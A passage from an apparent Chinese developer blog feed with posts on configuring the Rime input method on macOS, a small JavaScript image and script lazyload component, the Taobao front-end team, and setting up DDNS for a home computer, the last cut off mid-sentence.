        <content type="html"><![CDATA[<p>使用 Mac 快两年时间了，码字错误率提高了 200%。国内两款输入法 百度／搜狗，其实都挺好用的，但是有几个毛病：</p><ul><li>不流畅，有的时候感觉跟不上我的速度</li><li>在部分软件内输入存在问题，卡死或者 CPU 飙高</li><li>半角全角不好控制</li></ul><span id="more"></span><p>因为百度输入法在 xx 编辑软件内会 loading 甚至死掉，而且联想功能和自动纠错功能太弱，我换成了搜狗，最近搜狗输入法一个 bug 把我郁闷死了：</p><p><a href="http://weibo.com/1812166904/D4hGckyzd"><img src="/../blogimgs/2015/11/20/20151105_5356dbce.jpg" alt="搜狗输入法bug - 微博"></a></p><p>反馈给他们的技术人员，但是目前也没看到新版本更新，恰巧看到同事使用一款从来没见过的输入法，网上搜索了一番，感觉挺不错。</p><p>这块输入法的名字叫做 Rime，中文名为：鼠须管（它有好几个名字，Windows 下叫做小狼毫），我用的是 Mac，就没有去研究 windows&#x2F;Linux 下的 Rime 了，你能想到的输入法，它都支持，兼顾 windows&#x2F;Linux&#x2F;Mac 三大系统。</p><p><img src="/../blogimgs/2015/11/20/20151105_0f27f553.png" alt="鼠须管"></p><h3 id="关于-Rime"><a href="#关于-Rime" class="headerlink" title="关于 Rime"></a>关于 Rime</h3><p>网上搜索最先看到的时两篇文章，一篇是 <a href="http://www.ifanr.com/156409">爱范儿</a> 对它的介绍，另一篇是 <a href="//www.byvoid.com/blog/recommend-rime/">BYVoid</a> 对它的赞扬，称之为「神级输入法」。</p><p>这个输入法是“佛振”开发的，我不了解这个人，但是从 Github 上可以看到他的<a href="//github.com/rime">一些项目</a>，应该是个低调的大牛。</p><p>Rime 的官网地址：<a href="http://rime.im/">http://rime.im/</a>。听同事说，他使用 Rime 的时候还没有官网，之前是在 google code 上下载安装的。官网几个大字屹立：“聪明的输入法懂我的心意”。作者的编程思想是：</p><ul><li>技巧加蛮力</li><li>慢工出细活</li><li>创造艺术和美</li><li>登峰造极之作</li></ul><p>很有雅韵，不过「慢工出细活」这句话估计也是无奈之语，因为这东西的开发人力投入并不多，一两个人搞，还得兼顾这么多平台，自然就慢。很多人评论说 Rime 流畅、丝滑，怎么说呢，Rime 的词库不多，它的哲学也不提倡导入太多的词库，期望用户根据自己的输入习惯自然形成个性化的词库。这是它快的原因之一，不像搜狗输入法，安装的时候就给用户安装、导入一堆东西，检索的时候自然也就慢了。</p><h3 id="安装和使用"><a href="#安装和使用" class="headerlink" title="安装和使用"></a>安装和使用</h3><p>如果你是一位 Mac 用户，电脑上应该已经安装了 <a href="http://brew.sh/">Homebrew</a> 了吧，如果已经安装了 Homebrew，不妨再安装一个 <a href="http://caskroom.io/">Homebrew Cask</a>，它打包了很多软件，可以一个命令完成一个软件的安装和配置，比如安装 Rime：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ brew cask install squirrel</span><br></pre></td></tr></table></figure><p>我建议你把墙打开，我试过，不翻过墙，安装的速度是 0. 安装好了之后，你只需要关注一个目录：<code>~/Library/Rime</code>，这个目录下容纳了很多东西，包括接下来你需要配置的。</p><p>如果你没有安装 Homebrew，请移步 <a href="http://rime.im/download/">这里</a>，或者自行 <a href="//www.google.com.hk/search?q=Rime+%E5%AE%89%E8%A3%85">google</a>。</p><p>当你完成上述操作之后，我建议你先进入 <code>系统偏好设置-&gt;键盘-&gt;输入源</code>，把 鼠须管 和 默认ABC 之外的输入法先删除，因为你已经不需要它了，就像我这样：</p><p><img src="/../blogimgs/2015/11/20/20151105_76b01a35.png" alt="删除其他输入法"></p><p>在我们上面提到的目录中，有很多东西，看着会有点头晕：</p><p><img src="/../blogimgs/2015/11/20/20151105_121a1bdb.png" alt="Rime 目录"></p><p>但是可以清晰的看到有好几组，分别是 cangjie5（仓颉拼音）、double_pinyin_flypy（双拼）、luna_pinyin（朙月拼音）、luna_pinyin_simp（朙月拼音简体）等等。大多数人需要关注的是 <code>squirrel.custom.yaml</code>（输入法皮肤配置） 以及 <code>default.custom.yaml</code>（输入法引擎配置）这两个文件。</p><p>我觉得你没太多必要了解这些配置的细节内容，将下面代码复制进去，然后部署下。</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># default.custom.yaml, 全局生效</span></span><br><span class="line"><span class="attr">patch:</span></span><br><span class="line">    <span class="attr">menu/page_size:</span> <span class="number">9</span>      <span class="comment">#这是之前增加的候选词数量。</span></span><br><span class="line">    <span class="attr">schema_list:</span>           <span class="comment">#“输入选单”中激活的输入方案定义。</span></span><br><span class="line">     <span class="comment">#  - schema: terra_pinyin</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">schema:</span> <span class="string">luna_pinyin</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">schema:</span> <span class="string">emoji</span></span><br><span class="line">     <span class="comment">#  - schema: luna_pinyin_fluency</span></span><br><span class="line">     <span class="comment">#  - schema: double_pinyin_mspy</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">schema:</span> <span class="string">luna_pinyin_simp</span></span><br><span class="line">     <span class="comment">#  - schema: bopomofo</span></span><br><span class="line">     <span class="comment">#  - schema: double_pinyin_flypy</span></span><br><span class="line"><span class="comment">#下面定义“输入选单”的切换控</span></span><br><span class="line">    <span class="attr">switcher:</span></span><br><span class="line">        <span class="attr">abbreviate_options:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">caption:</span> <span class="string">&quot;〔切换输入方案〕&quot;</span>          <span class="comment">#把默认的“方案選單”修改为了“切换”。</span></span><br><span class="line">        <span class="attr">fold_options:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">hotkeys:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">&quot;Control+grave&quot;</span>       <span class="comment">#默认方案</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">&quot;Control+Shift+grave&quot;</span>   <span class="comment">#默认方案</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">&quot;Control+s&quot;</span>             <span class="comment">#新增方案</span></span><br><span class="line">        <span class="attr">option_list_separator:</span> <span class="string">&quot;／&quot;</span>   <span class="comment">#以下都为默认custom.yaml文件的默认配置，copy过来就可以。</span></span><br><span class="line">        <span class="attr">save_options:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">full_shape</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">ascii_punct</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">simplification</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">extended_charset</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">适用于【鼠须管】0.9.13+</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">位置：~/Library/Rime/squirrel.custom.yaml</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">用法：想要哪项生效，就删去该行行首的 <span class="string">&quot;#&quot;</span> 字符，但注意保留用于缩进的空格</span></span><br><span class="line"></span><br><span class="line">patch:</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> us_keyboard_layout: <span class="literal">true</span>                 <span class="comment"># 键盘选项：应用美式键盘布局</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">状态通知，适当，也可设为全开（always）全关（never）</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> show_notifications_when: appropriate</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"> style/color_scheme: lost_temple                    <span class="comment"># 选择配色方案</span></span></span><br><span class="line"> style/horizontal: true                     # 候选窗横向显示</span><br><span class="line"> style/inline_preedit: false                # 关闭内嵌编码，这样就可以显示首行的拼音</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> style/corner_radius: 10                  <span class="comment"># 窗口圆角半径</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> style/border_height: 0                   <span class="comment"># 窗口边界高度，大于圆角半径才有效果</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> style/border_width: 0                    <span class="comment"># 窗口边界宽度，大于圆角半径才有效果</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> style/line_spacing: 1                    <span class="comment"># 候选词的行间距</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> style/spacing: 5                         <span class="comment"># 在非内嵌编码模式下，预编辑和候选词之间的间距</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> style/font_face: <span class="string">&quot;Hiragino Sans GB W3&quot;</span>   <span class="comment"># 字体名称</span></span></span><br><span class="line"> style/font_point: 28                       # 字号</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">注：预设的配色方案及代码（指定为 style/color_scheme ）</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  碧水 - aqua</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  青天 - azure</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  明月 - luna</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  墨池 - ink</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  孤寺 - lost_temple</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  暗堂 - dark_temple</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  星际我争霸 - starcraft</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  谷歌 - google</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  晒经石 - solarized_rock</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  简约白 - clean_white</span></span><br></pre></td></tr></table></figure><p>yaml 配置简洁易懂，而且还有注释说明，相信聪明的你可以自己尝试微调。以上修改完成之后，需要部署（相当于修改了配置之后需要重新编译一次）。</p><p>部署有两种方式：在顶部 toolbar 中找到输入法按钮点开后的「重新部署」选项；或者按下 <code>Ctrl + alt +  ~</code> 组合键。</p><p>如果你需要输入 emoji 或者刚开始安装切换到简体输入法（安装后默认为繁体），你需要按下组合键 <code>Ctrl + ~</code>，这里需要注意的是 Sublime Text 的快捷键跟切换输入引擎组合键冲突了，建议 focus 到其他窗口再按组合键，不过在我们上面部署完了之后会解决这个问题，因为我们在 <code>default.custom.yaml</code> 配置了其他的 HotKeys，可以通过 <code>Ctrl + s</code> 和 <code>Ctrl + Shift + ~</code> 进行切换操作。</p><p><strong>小 Tip</strong> </p><p>如果你期望快速输入 emoji，比如输入 <code>cry</code> 就会出现哭的表情，可以这么干：</p><p>在你目前使用的输入法对应的自定义配置项中配置如下内容（我用的是简体输入，对应的是 <code>luna_pinyin_simp.custom.yaml</code>）</p><figure class="highlight nestedtext"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  luna_pinyin_simp.custom.yaml</span></span><br><span class="line"><span class="attribute">patch</span><span class="punctuation">:</span></span><br><span class="line">    <span class="attribute">engine/translators</span><span class="punctuation">:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">punct_translator</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">r10n_translator</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">reverse_lookup_translator</span></span><br><span class="line">    <span class="attribute">recognizer/patterns/reverse_lookup</span><span class="punctuation">:</span> <span class="string">&quot;`[a-z]*$&quot;</span></span><br><span class="line">    <span class="attribute">schema/dependencies</span><span class="punctuation">:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">emoji</span></span><br><span class="line">    <span class="attribute">abc_segmentor/extra_tags</span><span class="punctuation">:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">reverse_lookup</span></span><br><span class="line">    <span class="attribute">reverse_lookup</span><span class="punctuation">:</span></span><br><span class="line">        <span class="attribute">dictionary</span><span class="punctuation">:</span> <span class="string">emoji</span></span><br><span class="line">        <span class="attribute">enable_completion</span><span class="punctuation">:</span> <span class="string">false</span></span><br><span class="line">        <span class="attribute">prefix</span><span class="punctuation">:</span> <span class="string">&quot;`&quot;</span></span><br><span class="line">        <span class="attribute">tips</span><span class="punctuation">:</span> <span class="string">〔表情〕</span></span><br></pre></td></tr></table></figure><p>它的作用是，当你按下 “`“ 这个符号的时候，会进入 emoji 的输入模式，或者平时随意输入的时候也会偶尔出现 emoji。我把这个配置项删掉了，原因是，当我输入一个字符，比如 “l” 的时候，我期望第一个出现的是 “了”，然而它确实 emoji，而且整排选项都是，如下图：</p><p><img src="/../blogimgs/2015/11/20/20151106_3b4722c1.png" alt="emoji"></p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>如果你是一个资深爱折腾玩家，建议阅读这两篇文章：</p><ul><li><a href="http://www.dreamxu.com/install-config-squirrel/">安装及配置 Mac 上的 Rime 输入法——鼠鬚管 (Squirrel)</a></li><li><a href="http://www.jianshu.com/p/cffc0ea094a7">Rime输入法—鼠须管(Squirrel)词库添加及配置</a></li></ul><p>当然，可以直奔官网的说明：<a href="http://github.com/rime/home/wiki">http://github.com/rime/home/wiki</a>。</p><p>我用了两天，感觉很棒。我的皮肤设置（<code>squirrel.custom.yaml</code>）为：</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># squirrel.custom.yaml</span></span><br><span class="line"><span class="attr">patch:</span></span><br><span class="line">  <span class="comment"># us_keyboard_layout: true         # 键盘选项：应用美式键盘布局</span></span><br><span class="line">  <span class="comment"># show_notifications_when: growl_is_running  # 狀態通知，默認裝有Growl時顯示，也可設爲全開（always）全關（never）</span></span><br><span class="line">    <span class="attr">style/color_scheme:</span> <span class="string">demo</span>         <span class="comment"># 选择配色方案</span></span><br><span class="line">    <span class="attr">style/horizontal:</span> <span class="literal">true</span>           <span class="comment"># 候选窗横向显示</span></span><br><span class="line">  <span class="comment"># style/inline_preedit: false   # 关闭内嵌编码，这样就可以显示首行的拼音（MAC下不建议开启）</span></span><br><span class="line">    <span class="attr">style/corner_radius:</span> <span class="number">3</span>           <span class="comment"># 窗口圆角半径</span></span><br><span class="line">    <span class="attr">style/border_height:</span> <span class="number">4</span>           <span class="comment"># 窗口边界高度，大于圆角半径才有效果</span></span><br><span class="line">    <span class="attr">tyle/border_width:</span> <span class="number">4</span>             <span class="comment"># 窗口边界宽度，大于圆角半径才有效果</span></span><br><span class="line">  <span class="comment"># style/line_spacing: 1         # 候选词的行间距</span></span><br><span class="line">  <span class="comment"># style/spacing: 5              # 在非内嵌编码模式下，预编辑和候选词之间的间距</span></span><br><span class="line">    <span class="attr">style/font_face:</span> <span class="string">&quot;Lantinghei TC Extralight&quot;</span>  <span class="comment"># 预选栏文字字体，使用中文字体：兰亭黑-纤黑</span></span><br><span class="line">    <span class="attr">style/font_point:</span> <span class="number">17</span>             <span class="comment">#预选栏文字字号</span></span><br><span class="line">    <span class="attr">style/label_font_face:</span> <span class="string">&quot;Myriad Pro Light&quot;</span>  <span class="comment"># 预选栏编号字体，使用西文字体：Myriad Pro Light</span></span><br><span class="line">    <span class="attr">style/label_font_point:</span> <span class="number">17</span>       <span class="comment">#预选栏编号字号</span></span><br><span class="line">     <span class="comment">#上述是候选栏的基本设置，确定了文字的大小和候选栏的外观样式。</span></span><br><span class="line">     <span class="comment">#下面是“demo”样式文件的配置，主要确定候选栏颜色配置。</span></span><br><span class="line">    <span class="attr">preset_color_schemes:</span></span><br><span class="line">    <span class="attr">demo:</span>        <span class="comment">#样式名称，就是上述“style/color_scheme: demo”</span></span><br><span class="line">    <span class="attr">author:</span> <span class="string">&quot;Barret Lee &lt;barret.china@gmail.com&gt;&quot;</span>        <span class="comment">#作者</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">&quot;小胡子哥&quot;</span>                      <span class="comment">#作者名字</span></span><br><span class="line">    <span class="attr">label_color:</span> <span class="number">0xf2a45a</span>                    <span class="comment">#预选栏编号颜色</span></span><br><span class="line">    <span class="attr">back_color:</span> <span class="number">0x333333</span>                    <span class="comment">#背景颜色</span></span><br><span class="line">    <span class="attr">candidate_text_color:</span> <span class="number">0xb9b9b9</span>          <span class="comment">#非第一后选项文字颜色</span></span><br><span class="line">    <span class="attr">comment_text_color:</span> <span class="number">0xa5a5a5</span>            <span class="comment">#注解文字颜色</span></span><br><span class="line">    <span class="attr">hilited_candidate_back_color:</span> <span class="number">0x333333</span>    <span class="comment">#第一后选项背景颜色</span></span><br><span class="line">    <span class="attr">hilited_candidate_text_color:</span> <span class="number">0xff7d00</span>    <span class="comment">#第一后选项文字颜色</span></span><br><span class="line">    <span class="attr">hilited_comment_text_color:</span> <span class="number">0x00a5ea</span>      <span class="comment">#注解文字高亮</span></span><br><span class="line">    <span class="attr">hilited_text_color:</span> <span class="number">0x7fffff</span>              <span class="comment">#拼音串高亮（需要开启内嵌编码）</span></span><br><span class="line">    <span class="attr">text_color:</span> <span class="number">0xa5a5a5</span>                      <span class="comment">#拼音串颜色（需要开启内嵌编码）</span></span><br></pre></td></tr></table></figure><p>效果是这样：</p><p><img src="/../blogimgs/2015/11/20/20151105_a9e4fc48.png" alt="Rime 配置效果"></p><p>好吧，希望你能玩的愉快。</p><p>P.S: 这篇文章我没有复查，应该没太多错别字 ；）</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Rime </tag>
            
            <tag> 鼠须管 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图片脚本懒加载 - Lazyload</title>
      <link href="/blog/2015/11/16/lazyload-component/"/>
      <url>/blog/2015/11/16/lazyload-component/</url>
      
        <content type="html"><![CDATA[<p><strong>注：代码有更新，细节以 github 的 README 说明为准。</strong></p><p>写了一个轻巧的小程序 - Lazyload，100 行代码。加上一个 <code>data-src</code> 属性，能够让页面中的图片懒加载、textarea 中的脚本懒执行，有需要的可以拿过去用用，代码逻辑比较简单，也可以自己增强点功能，比如动态添加懒加载监听等等。</p><span id="more"></span><ul><li>仓库地址：<a href="http://github.com/barretlee/lazyload">http://github.com/barretlee/lazyload</a></li><li>Demo地址：<a href="http://barretlee.github.io/lazyload/demo/index.html">http://barretlee.github.io/lazyload/demo/index.html</a></li></ul><p>核心代码：</p><figure class="highlight qml"><table><tr><td class="code"><pre><span class="line">Lazyload.prototype._detectElementIfInScreen = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="keyword">this</span>.elements.length) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, len = <span class="keyword">this</span>.elements.length; i &lt; len; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> ele = <span class="keyword">this</span>.elements[i];</span><br><span class="line">    <span class="keyword">var</span> <span class="built_in">rect</span> = ele.getBoundingClientRect();</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">rect</span>.top &gt;= Lazyload.DISTANCE &amp;&amp; <span class="built_in">rect</span>.left &gt;= Lazyload.DISTANCE</span><br><span class="line">      &amp;&amp; <span class="built_in">rect</span>.top &lt;= (<span class="built_in">window</span>.innerHeight || <span class="built_in">document</span>.documentElement.clientHeight)</span><br><span class="line">      &amp;&amp; <span class="built_in">rect</span>.left &lt;= (<span class="built_in">window</span>.innerWidth || <span class="built_in">document</span>.documentElement.clientWidth)) &#123;</span><br><span class="line">      <span class="keyword">this</span>.loadItem(ele, i);</span><br><span class="line">      <span class="keyword">this</span>.elements.splice(i, <span class="number">1</span>);</span><br><span class="line">      i--; len--;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里主要用到了 <code>getBoundingClientRect</code> 这个函数，兼容性没话说，IE6 都兼容，他的作用是获取元素距离视窗上下左右的距离：</p><p><img src="/../blogimgs/2015/11/16/20151101_a1f44914.jpg" alt="Chrome getBoundingClientRect"></p><p>配置了两个参数：</p><ul><li><code>Lazyload.TAG</code>，默认是 “data-src”</li><li><code>Lazyload.DISTANCE</code>，可以设置元素提前多少像素加载，默认是 0，即进入视窗便加载。</li></ul><p>使用方式：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://raw.githubusercontent.com/barretlee/lazyload/master/index.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;box&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> <span class="attr">data-src</span>=<span class="string">&quot;img-path&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;item&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">textarea</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="keyword">new</span> <span class="title class_">Lazyload</span>(<span class="string">&quot;.box .item&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>请轻点拍砖；）</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> lazyload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>淘宝 UED 前端团队究竟好不好？值得去吗？</title>
      <link href="/blog/2015/11/13/taobao-fed-come-on/"/>
      <url>/blog/2015/11/13/taobao-fed-come-on/</url>
      
        <content type="html"><![CDATA[<p>在知乎上回答了一个问题：<a href="http://www.zhihu.com/question/20099712/answer/72038656?group_id=648511339476205568">『淘宝 UED<br>前端团队究竟好不好？值得去吗？』</a></p><span id="more"></span><p>这个问题好像有三年多了，那个时候我还在大二，刚接触前端，对这行也不是很了解。经过这几年的技术改造，尤其是现在也是淘宝前端团队一员，还是想说两句。</p><p>现在没有淘宝UED了，之前淘宝网的前端团队从属于用户体验部，现在分离出来并到了淘宝技术部，更名为『淘宝前端团队（Taobao FED）』，我们的官网地址：<a href="http://taobaofed.org/">http://taobaofed.org</a> 。风驰、小马等也分别去了阿里云和技术保障部。（前端需求是很大的，具备领导者素养的，集团也会平均分配，从个人的发展角度，离开淘宝前端团队转岗其他团队也是明智之举嘛~）</p><p>双十一的交易额，从 12 年到 15 年，三年间可以说翻了好几倍。这些数据的背后除了因为中国经济 的迅速发展、互联网的迅猛崛起外，更少不了我们这些技术人在背后 支持。 业务和技术都在发展，对优秀人才的招募也是从未 停止。从国内前端团队的规模来看，应该没有 哪个公司的前端团队的人数比淘宝前端团队多。</p><p>要想让一个规模巨大的前端团队良好运作起来，我们开发了很多系统、筑起了很多的平台，每一个系统、每一个平台都值得你过来了解和学习，而这些就足够你学习一到两年时间，更不用说我们每周、每月多次的团队交流、跨团队交流以及丰富多彩的团队技术竞技。</p><p>刚过来的同学都会经过一次团队的洗礼，以前会有一些所谓的『比较黄』的破冰，我就经历过，当时确实十分尴尬，但是经历之后，回味起来，也会不禁撇一撇嘴角，微微一笑。而现在我们的破冰更加自然，你会发现，不管是你的师兄师姐，还是 leader&#x2F;boss，他们就是你的普通同事。我发现最近比较多的乐趣都是挑逗 boss，这就是我们团队的生活，简单而又不简单。</p><p>有人吐槽过，阿里的绩效考核制度，3.25&#x2F;3.75，对此，我觉得没啥好评价的，如果你是一个管理者，或者学习过管理学相关的知识，然后多看看知乎上其他关于制度考核的帖子，你会发现，阿里十多年的管理经验积累不是吹的！在这里，只要你有点子，你就有机会；只要你肯努力，你就是团队中一颗闪亮的星！</p><p>很多刚毕业的同学，可能跟我差不多，手里头有好几个大公司的 offer，然后开始纠结，到底去哪里好呢，百度、腾讯还是阿里巴巴。我实习是在北京百度，由于我的饮食口味略重，而刚好又没在百度总部（当时在奎科大厦），那伙食，真尼玛不能吃啊！那个时候，百度的主管跟我说，表现不错，给我 special offer，希望可以留下来，我犹豫了很久，但是来到淘宝之后，我已经没有任何犹豫了。</p><p>阿里巴巴西溪园区，8 幢大楼林立，中间一个池塘，每天路过能够听到鸭子嘎嘎嘎的声音。伙食真心不用说啊，我来了半年，胖了十斤…这里的食堂个数一只手的手指头根本数不过来，我不想继续形容，如果你在犹豫，可以来阿里西溪园区，我请客，带你逛逛。</p><p>不过，我也听到了一个可笑的声音，『西溪的环境太好了，我觉得太安逸，所以选择其他公司』。我想，很多人在面试的时候被 HR 问过，你怎么看待加班这个问题吧。难道你觉得一个有机会让你加班的公司会很安逸？如果你可以把自己定位得高一点，你永远都不会觉得安逸。安逸来自于内心，而不是环境。</p><p>现如今，互联网的形式有些波动，两家联姻， 却又被 BAT 收购；跳槽到东家，结果被老东家又收了回去。跳槽并没有你们道听途说的那么频繁，反倒是大公司招人却越来越难，因为前端发展这么快，门槛也会越来越高，自然金字塔上层的人的比例就会越来越小。</p><p>好吧，说了这么多，还是得按照套路出牌，如果你对淘宝前端团队感兴趣，请联系我：</p><ul><li>Email： barret.china(at)gmail.com</li><li>微博私信：<a href="http://weibo.com/173248656">http://weibo.com/173248656</a></li></ul><p>关于<a href="/about/">小胡子哥</a>。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 淘宝前端团队 </tag>
            
            <tag> Taobao FED </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>将你家里的电脑连上广域网</title>
      <link href="/blog/2015/11/07/put-your-computer-to-internet/"/>
      <url>/blog/2015/11/07/put-your-computer-to-internet/</url>
      
        <content type="html"><![CDATA[<p>很多人买电脑半年一年之后，都会遇到这样一个问题：硬盘已经装不下？尤其是有些爱折腾的朋友喜欢安装多个系统，或者爱把各种美剧批量下载到本地，渐渐地，也只好去网上搜罗个硬盘。现在四五百就能买到一个 1TB 的硬盘，也不算很贵，可是电脑边上总挂着一坨东西，不仅不方便也不好看。</p><span id="more"></span><p>有同事给我推荐 <a href="http://baike.baidu.com/link?url=pbVuGISpwCNstrRLd-ZC_z52uG0pg369bw58rDyQgS8sNgggh33mUcl6LkDrOqNBCyLM7OBfFiwENkfwUeZ-o9DJ6w_H5CRh2CDq1H3qOny">NAS</a>，我觉得是相当不错的一个方案，包括硬盘在内，一般用户配置可以控制在 2000-5000 人民币。喜欢折腾的也可以考虑 GEN8，价格在 1500-3000 人民币，得自己搞系统，NAS 对小白用户很和谐的地方是，DMZ 有一个中央系统，并且提供了 Web 控制界面，相当于以 NAS 硬盘作为储存中心，WebOS 上操作。</p><p>如果我选了 NAS&#x2F;GEN8 估计也不会写这篇文章了。既然家里有闲置的电脑，而自己也有硬盘，就没有必要再去购买其他网络设备搭建远程操控环境了~</p><h3 id="解决-DDNS-的问题"><a href="#解决-DDNS-的问题" class="headerlink" title="解决 DDNS 的问题"></a>解决 DDNS 的问题</h3><p>能够从万千网络中定位一台机器，估计也就只有 IP 了，家里安装的是电信的宽带，不像教育网分配了固定的网段，电信这种拨号方式上网的方式每次分配到的 IP 是动态变化的。为了能够拿到 IP，我们必须把变化的 IP 存在一个位置去，有三种方案：</p><ul><li>如果你有一台服务器（如阿里云主机），你可以将本地 IP 每隔一分钟告知云主机，让与主机记住 IP 地址</li><li>如果你有一个域名，你可以将域名解析服务器迁移到 DNSPod 提供的 NS，然后新增一个子域名添加 A 记录到任意 IP，接着通过 DNSPod 提供的接口实时修改 A 记录的 IP 地址</li><li>如果你既没有服务器，也没有自己的域名，可以在花生壳上注册一个域名，然后在你的路由器上（如果支持）配置花生壳，如果你的路由器不支持花生壳动态域名配置，你得下载一个花生壳的客户端，在客户端上配置。最终的结果同上，花生壳提供给你的免费域名会指向你的本地 IP。</li></ul><p>我的博客托管在 github 提供的静态文本服务中，之前买的主机也到期了，所以就选择了方案二。</p><p><strong>1. 先拿到本地 IP</strong></p><p>在命令行输入 <code>ifconfig/ipconfig</code> 只能拿到路由器 DHCP 分配的地址，如 192.168.0.110，想拿到 IP，必须跟外网打交道，比如：<code>curl ipinfo.io</code>。</p><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">➜  ddns git:(<span class="literal">master</span>) ✗ curl ip<span class="literal">inf</span>o.io</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;ip&quot;</span>: <span class="string">&quot;115.*.*.*&quot;</span>,</span><br><span class="line">  <span class="string">&quot;hostname&quot;</span>: <span class="string">&quot;No Hostname&quot;</span>,</span><br><span class="line">  <span class="string">&quot;city&quot;</span>: <span class="string">&quot;Hangzhou&quot;</span>,</span><br><span class="line">  <span class="string">&quot;region&quot;</span>: <span class="string">&quot;Zhejiang Sheng&quot;</span>,</span><br><span class="line">  <span class="string">&quot;country&quot;</span>: <span class="string">&quot;CN&quot;</span>,</span><br><span class="line">  <span class="string">&quot;loc&quot;</span>: <span class="string">&quot;30.*,120.*&quot;</span>,</span><br><span class="line">  <span class="string">&quot;org&quot;</span>: <span class="string">&quot;*&quot;</span></span><br><span class="line">&#125;%</span><br></pre></td></tr></table></figure><p>如上所示，通过 ipinfo.io 提供的服务，我们可以很方便拿到外网。</p><p><strong>2. 推到 